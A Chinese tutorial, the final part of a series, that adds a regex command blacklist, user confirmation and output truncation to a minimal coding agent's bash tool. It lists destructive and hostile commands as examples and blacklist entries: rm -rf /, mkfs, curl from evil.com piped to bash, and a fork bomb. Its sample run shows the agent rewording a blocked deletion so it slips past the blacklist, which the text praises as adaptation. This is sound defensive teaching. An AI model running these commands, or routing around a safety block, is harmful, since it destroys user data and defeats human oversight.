# 从零开始理解 Agent（七）：Agent 执行 rm -rf / 怎么办？三道安全防线

> **「从零开始理解 Agent」系列** —— 从一个极简开源项目 [nanoAgent](https://github.com/sanbuphy/nanoAgent) 出发，逐层拆解 OpenClaw / Claude Code 等 AI Agent 背后的全部核心概念。
>
> - [第一篇：底层原理，只有 115 行](../01-essence/agent-essence.md) —— 工具 + 循环
> - [第二篇：记忆与规划](../02-memory/agent-memory.md) —— 182 行
> - [第三篇：Rules、Skills 与 MCP](../03-skills-mcp/agent-skills-mcp.md) —— 265 行
> - [第四篇：SubAgent 子智能体](../04-subagent/agent-subagent.md) —— 192 行
> - [第五篇：多智能体协作与编排](../05-teams/agent-teams.md) —— 270 行
> - [第六篇：上下文压缩](../06-compact/agent-compact.md) —— 169 行
> - **第七篇：安全与权限控制**（本文）—— 219 行

前六篇我们一直在给 Agent 加能力。但有一个危险我们一直视而不见：**Agent 手里有一把没有保险的枪。**

回忆第一篇中的 `execute_bash` 工具——它可以执行任意 shell 命令。任意。包括 `rm -rf /`、`mkfs.ext4 /dev/sda`、`curl http://evil.com | bash`。LLM 不是完美的，它有可能因为理解错误、幻觉、或者 prompt 注入而执行危险操作。

这不是理论风险。只要你让 Agent 干过真正的活，一定遇到过它试图做一些你没预料到的事情。

今天我们回到 agent-essence.py 的基础上，加上三道安全防线，让 Agent 从"裸奔"变成"有保险的"。

> **关于本篇代码的说明：**
>
> 和第四、五、六篇一样，本篇的 `agent-safe.py` 是**新开发的文件**（[GitHub 源码](https://github.com/GitHubxsy/nanoAgent/blob/main/07-safety/agent-safe.py)），基于第一篇的 `agent-essence.py`，只新增了三道安全防线。

---

## 一、Agent 的安全问题到底有多严重？

先看几个 Agent 可能执行的命令：

```bash
# LLM 想"清理临时文件"，但路径搞错了
rm -rf /

# LLM 想"重置数据库"，结果格式化了磁盘
mkfs.ext4 /dev/sda1

# LLM 在网上"找到了一个解决方案"
curl http://malicious.com/script.sh | bash

# LLM 想"修复权限问题"
chmod 777 /

# LLM 陷入循环，输出了一个 10MB 的文件内容，撑爆 context window
cat /var/log/syslog
```

这些不是 LLM 故意为之，而是它在"尽力完成任务"的过程中可能走错的路。LLM 不理解"删除根目录"的后果——对它来说，`rm` 只是一个"删除文件的工具"。

OpenClaw 和 Claude Code 是怎么解决的？它们都有一个共同的设计：**每次执行命令前，弹出确认框让用户决定 Allow 还是 Deny。** 这就是人机协作的安全边界。

---

## 二、三道防线的设计思路

我们的安全方案由三道防线组成，由外到内逐层过滤：

```
LLM 输出一条命令
  │
  ▼
防线 1: 命令黑名单
  │ "rm -rf /" → 🚫 直接拦截，不问用户
  │ "ls -la"   → ✅ 通过
  ▼
防线 2: 用户确认
  │ "find . -name '*.py'" → 用户看到后按 Y 放行
  │                        → 用户按 N 跳过
  │                        → 用户按 Q 终止 Agent
  ▼
防线 3: 输出截断
  │ 命令输出 10000 行 → 截断为首尾各 2500 字符
  │ 命令输出 10 行    → 原样返回
  ▼
结果返回给 LLM
```

三道防线各管一层：黑名单管"绝对不能做的"，用户确认管"需要人类判断的"，输出截断管"结果太大的"。

---

## 三、防线 1：命令黑名单

```python
DANGEROUS_PATTERNS = [
    r'\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)',  # rm -rf
    r'\brm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?/',                     # rm /
    r'\bmkfs\b',                    # 格式化磁盘
    r'\bdd\s+.*of\s*=\s*/dev/',     # 覆写磁盘
    r'>\s*/dev/sd[a-z]',            # 重定向到磁盘设备
    r'\bchmod\s+(-R\s+)?777\s+/',   # chmod 777 /
    r':\(\)\s*\{',                  # fork bomb
    r'\bcurl\b.*\|\s*(ba)?sh',      # curl | bash
    r'\bwget\b.*\|\s*(ba)?sh',      # wget | bash
    r'\bshutdown\b',                # 关机
    r'\breboot\b',                  # 重启
]

def is_dangerous(command):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return True, pattern
    return False, None
```

这是最简单粗暴但最可靠的防线。不需要 AI 判断，不需要语义理解，**纯正则匹配**。`rm -rf /` 命中第一条规则，直接拦截，连用户确认的机会都不给。

在 `execute_bash` 函数的最开头调用：

```python
def execute_bash(command):
    dangerous, pattern = is_dangerous(command)
    if dangerous:
        return f"🚫 命令被拦截（匹配危险模式: {pattern}）: {command}"
    # ... 继续执行
```

LLM 会收到"命令被拦截"的返回信息，然后它可以尝试换一种安全的方式来完成任务。

### 黑名单能拦住所有危险命令吗？

不能。黑名单只能拦住**已知的危险模式**。一个精心构造的命令（比如用变量拼接、base64 编码）可以绕过正则匹配。所以黑名单不是唯一防线——它只是第一道过滤，挡住最明显的危险操作。真正的兜底靠第二道防线。

---

## 四、防线 2：用户确认

```python
def ask_user_confirmation(tool_name, args):
    if AUTO_APPROVE:
        return True

    print(f"\n┌─ 确认执行 ─────────────────────────────")
    print(f"│ 工具: {tool_name}")
    for key, value in args.items():
        print(f"│ {key}: {str(value)[:200]}")
    print(f"└────────────────────────────────────────")

    while True:
        answer = input("[Y]执行 / [N]跳过 / [Q]终止 Agent > ").strip().lower()
        if answer in ('y', 'yes', ''):
            return True
        elif answer in ('n', 'no'):
            return False
        elif answer in ('q', 'quit'):
            sys.exit(0)
```

通过了黑名单的命令，在执行前还要过人类这一关。用户看到完整的命令内容后，有三个选择：

| 输入 | 效果 |
|------|------|
| `Y` 或回车 | 放行，执行这条命令 |
| `N` | 跳过，返回"用户跳过了此命令"给 LLM |
| `Q` | 直接终止整个 Agent |

这就是 OpenClaw / Claude Code 中 "Allow / Deny" 机制的极简版。

### 所有工具都需要确认吗？

在 `agent-safe.py` 中，三个工具（bash、read_file、write_file）都会触发确认。但在实际产品中，确认策略可以更精细：

- `read_file` 通常是安全的——只读不写，可以默认放行
- `write_file` 要看路径——写入项目目录内的放行，写入 `/etc/` 的要确认
- `bash` 最危险——每次都确认，或者用白名单模式（只允许 `ls`、`grep`、`cat` 等安全命令免确认）

`--auto` 参数可以跳过所有确认，用于信任场景（比如在 Docker 容器里运行）。

---

## 五、防线 3：输出截断

```python
MAX_OUTPUT_LENGTH = 5000

def truncate_output(text):
    if len(text) <= MAX_OUTPUT_LENGTH:
        return text
    half = MAX_OUTPUT_LENGTH // 2
    return (
        text[:half]
        + f"\n\n... [输出过长，已截断。原始 {len(text)} 字符，保留首尾各 {half} 字符] ...\n\n"
        + text[-half:]
    )
```

这道防线解决的不是"命令危险"的问题，而是"结果太大"的问题。

想象 LLM 执行了 `cat /var/log/syslog`，返回了 10MB 的日志。这些内容会被追加到 `messages` 里，下一轮 API 调用就会因为 context window 超限而失败。第六篇讲的压缩是事后补救，输出截断是**从源头控制**。

截断策略是保留首尾各一半——开头通常包含列标题或文件头部信息，结尾通常包含最新的内容或错误信息，中间的细节可以丢掉。

---

## 六、三道防线在 execute_bash 中的串联

```python
def execute_bash(command):
    # 防线 1: 黑名单
    dangerous, pattern = is_dangerous(command)
    if dangerous:
        return f"🚫 命令被拦截: {command}"

    # 防线 2: 用户确认
    if not ask_user_confirmation("execute_bash", {"command": command}):
        return "用户跳过了此命令。"

    # 执行
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "Error: 命令执行超时（30秒）"
    except Exception as e:
        output = f"Error: {str(e)}"

    # 防线 3: 输出截断
    return truncate_output(output)
```

三道防线在一个函数里依次串联：先过黑名单 → 再过用户确认 → 最后截断输出。每道防线都是独立的，拦住了就直接返回，不进入下一道。

---

## 七、实际运行效果

```bash
$ python 07-safety/agent-safe.py "清理 /tmp 下的所有文件"
```

```
[Tool] execute_bash({"command": "rm -rf /tmp/*"})
  🚫 命令被拦截（匹配危险模式: rm -rf）: rm -rf /tmp/*

（LLM 收到拦截信息后换了一种方式）

[Tool] execute_bash({"command": "find /tmp -type f -delete"})

┌─ 确认执行 ─────────────────────────────
│ 工具: execute_bash
│ command: find /tmp -type f -delete
└────────────────────────────────────────
[Y]执行 / [N]跳过 / [Q]终止 Agent > n

（用户觉得不安全，跳过了）

[Tool] execute_bash({"command": "ls /tmp"})

┌─ 确认执行 ─────────────────────────────
│ 工具: execute_bash
│ command: ls /tmp
└────────────────────────────────────────
[Y]执行 / [N]跳过 / [Q]终止 Agent > y

（用户放行，Agent 先看看 /tmp 里有什么再决定下一步）
```

注意 LLM 的行为：第一次 `rm -rf` 被拦截后，它尝试了 `find -delete`（绕过了黑名单但被用户拒绝），最后退而求其次先 `ls` 看看情况。**Agent 在安全约束下会自适应调整策略**——这正是把拦截信息返回给 LLM 的好处。

---

## 八、nanoAgent vs 生产级安全方案

| 维度 | agent-safe.py | OpenClaw / Claude Code 等 |
|------|--------------|---------------------------|
| 命令过滤 | 正则黑名单 | 更精细的分类：安全命令免确认、危险命令强制拦截、中间地带让用户选 |
| 用户确认 | 文本终端 Y/N | 图形化界面，支持 "Always allow" 记住选择 |
| 执行隔离 | 无 | Docker / 虚拟机沙箱，限制文件系统访问范围 |
| 输出控制 | 字符数截断 | 基于 token 数精确控制，结合第六篇的压缩机制 |
| 网络控制 | 无 | 限制可访问的域名、禁止下载执行脚本 |

nanoAgent 的方案是"最小可行安全"——三道防线用不到 80 行代码实现，但已经覆盖了最常见的风险。生产环境在此基础上叠加沙箱隔离和更精细的策略。

---

## 九、进化方向：从硬编码到 Hook 管道

回头看一下 `execute_bash` 的代码结构：

```python
def execute_bash(command):
    is_dangerous(command)           # 检查 1：黑名单
    ask_user_confirmation(...)      # 检查 2：用户确认
    result = subprocess.run(...)    # 实际执行
    truncate_output(result)         # 后处理：截断
```

三道防线是**硬编码**在函数里的。想加一个新检查（比如"记录所有命令到日志文件"），就得改 `execute_bash` 的代码。想对 `read_file` 加同样的检查，又得再写一遍。

生产级 Agent 框架会把这些检查抽象成 **Hook（钩子）机制**——一个可插拔的管道：

```python
# 定义 Hook 管道
before_hooks = [check_blacklist, ask_confirmation, log_command]
after_hooks  = [truncate_output, log_result]

# 通用的工具执行函数
def execute_tool(name, args):
    # 执行前：依次过所有 before hook
    for hook in before_hooks:
        blocked, msg = hook(name, args)
        if blocked:
            return msg              # 任何一个 hook 可以拦截

    # 实际执行
    result = available_functions[name](**args)

    # 执行后：依次过所有 after hook
    for hook in after_hooks:
        result = hook(name, result)

    return result
```

这样做的好处：

- **可插拔**：加新检查只需要往列表里 `append` 一个函数，不用改核心代码
- **可复用**：同一套 Hook 对所有工具生效，不用每个工具各写一遍
- **可配置**：不同场景挂不同的 Hook 组合（开发环境宽松、生产环境严格）

本文的三道防线就是三个 Hook 的"手动版"。理解了硬编码版本，Hook 只是把 `if` 语句换成了 `for` 循环——从"写死哪些检查"变成"注册哪些检查"。

---

## 十、系列收官

七篇文章，从 115 行代码到完整的 Agent 认知体系：

| 篇 | 核心主题 | 一句话 |
|----|---------|--------|
| 一 | 工具 + 循环 | Agent 的最小本质 |
| 二 | 记忆 + 规划 | 记住过去，规划未来 |
| 三 | Rules + Skills + MCP | 扩展知识与工具 |
| 四 | SubAgent | 一次性临时工 |
| 五 | Teams | 有记忆、有身份、能通信的正式团队 |
| 六 | 上下文压缩 | 记住要点，忘掉细节 |
| **七** | **安全与权限** | **能力越大，防线越重要** |

前六篇回答"Agent 能做什么"，第七篇回答"Agent 不能做什么"。能力和约束是一体两面。

如果把 Agent 比作一辆车：

- 第一篇装了**引擎**（工具 + 循环）
- 第二篇装了**后视镜和导航**（记忆 + 规划）
- 第三篇装了**可换配件和使用手册**（Rules + Skills + MCP）
- 第四篇让它**能叫外援**（SubAgent）
- 第五篇让它**组建车队**（Teams）
- 第六篇装了**油量警告灯**（上下文压缩）
- 第七篇装了**刹车和安全气囊**（安全防线 + Hook）

七篇下来，这辆车从底盘到安全系统都齐了。把 OpenClaw 或 Claude Code 拆开看，里面就是这些东西——每一样单独拿出来都不复杂，组合在一起就构成了一个能自主工作的智能体。

写这个系列的初衷很简单：Agent 不应该是少数人的黑魔法，它的每一个核心概念都可以用几十行代码讲清楚。希望这七篇文章能帮你拨开迷雾，在 Agent 的世界里走得更踏实一些。

---

*本文基于 agent-safe.py（[GitHub 源码](https://github.com/GitHubxsy/nanoAgent/blob/main/07-safety/agent-safe.py)）分析。完整系列：[第一篇](../01-essence/agent-essence.md) → [第二篇](../02-memory/agent-memory.md) → [第三篇](../03-skills-mcp/agent-skills-mcp.md) → [第四篇](../04-subagent/agent-subagent.md) → [第五篇](../05-teams/agent-teams.md) → [第六篇](../06-compact/agent-compact.md) → 第七篇（本文）*
